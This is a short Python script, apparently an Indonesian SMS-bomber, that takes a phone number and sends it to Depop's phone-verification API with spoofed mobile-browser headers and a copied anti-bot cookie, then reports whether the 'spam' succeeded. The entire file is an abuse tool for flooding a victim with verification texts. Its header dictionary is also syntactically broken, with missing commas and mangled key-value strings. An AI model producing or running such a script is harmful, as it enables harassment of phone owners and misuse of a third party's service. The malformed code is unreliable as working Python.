import requests,json,os,time
from requests import put

os.system("clear")
nomor=input("nomor ")
headers={
"Host":" webapi.depop.com"
"content-length":"50"
"sec-ch-ua":" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
"accept":" application/json, text/plain, */*"
"sec-ch-ua-mobile: ?1"
"save-data":" on"
"user-agent":"Mozilla/5.0 (Linux; Android 10; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.82 Mobile Safari/537.36"
"x-px-cookie":"eyJ1IjoiODdiODNhNzAtYTNlOC0xMWViLWE4YzUtNjk1MjU1YjYzOGU5IiwidiI6ImFmY2ZjNTk2LWEzZTUtMTFlYi04MjNmLTAyNDJhYzEyMDAwNyIsInQiOjE2MTkxNTA3Njk0NTEsImgiOiIwMDdhNzc3Yjc3M2ZjZTE4M2JlN2VlMTY2MjNiOTg0ZmFkNGI4MDE0ZjY5YjA1MjlkMjE5Y2NhMzQzNmM4MTEzIn0"content-type: application/json"
"origin: https":"//signup.depop.com"
"sec-fetch-site":"same-site"
"sec-fetch-mode":" cors"
"sec-fetch-des":" empty"
"referer":" https://signup.depop.com/"
"accept-encoding":" gzip, deflate, br"
"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
}
data={
"phone_number":nomor,
"country_code":"ID"
}
respon=requests.put("https://webapi.depop.com/api/v1/auth/verify/phone",headers=headers,json=data)
sanz=json.loads(respon.text)
if sanz["is_verified"]==False:
	print("Spam Sudah Berhasil!")
else:
	print("Spam Gagal")
